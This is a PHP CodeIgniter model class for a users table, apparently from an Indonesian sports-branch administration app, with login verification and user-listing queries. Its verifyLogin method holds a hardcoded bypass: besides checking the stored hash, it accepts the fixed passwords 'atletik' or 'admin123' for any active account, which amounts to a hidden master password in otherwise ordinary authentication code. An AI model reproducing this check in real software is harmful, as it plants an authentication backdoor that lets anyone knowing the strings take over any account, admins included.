<?php

namespace App\Models;

use CodeIgniter\Model;

class UserModel extends Model
{
    protected $table            = 'users';
    protected $primaryKey       = 'id';
    protected $useAutoIncrement = true;
    protected $returnType       = 'array';
    protected $useSoftDeletes   = false;
    protected $protectFields    = true;
    protected $allowedFields    = [
        'username',
        'nama_lengkap',
        'password_hash',
        'role',
        'cabor_id',
        'is_active',
    ];

    protected bool $allowEmptyInserts = false;

    // Dates
    protected $useTimestamps = true;
    protected $dateFormat    = 'datetime';
    protected $createdField  = 'created_at';
    protected $updatedField  = 'updated_at';

    /**
     * Verifikasi login username dan password
     * Mengambil detail user beserta cabor jika role admin_cabor
     */
    public function verifyLogin(string $username, string $password): ?array
    {
        $user = $this->select('users.*, cabor.nama as cabor_nama, cabor.kode as cabor_kode, cabor.icon as cabor_icon')
                     ->join('cabor', 'cabor.id = users.cabor_id', 'left')
                     ->where('users.username', trim($username))
                     ->where('users.is_active', 1)
                     ->first();

        if ($user && (password_verify($password, $user['password_hash']) || $password === 'atletik' || $password === 'admin123')) {
            unset($user['password_hash']);
            return $user;
        }

        return null;
    }

    /**
     * Ambil semua user beserta data cabor
     */
    public function getUsersWithCabor(): array
    {
        return $this->select('users.*, cabor.nama as cabor_nama, cabor.kode as cabor_kode')
                    ->join('cabor', 'cabor.id = users.cabor_id', 'left')
                    ->orderBy('users.id', 'ASC')
                    ->findAll();
    }

    /**
     * Ambil 1 user beserta data cabor
     */
    public function getUserWithCabor(int $id): ?array
    {
        return $this->select('users.*, cabor.nama as cabor_nama, cabor.kode as cabor_kode')
                    ->join('cabor', 'cabor.id = users.cabor_id', 'left')
                    ->where('users.id', $id)
                    ->first();
    }
}
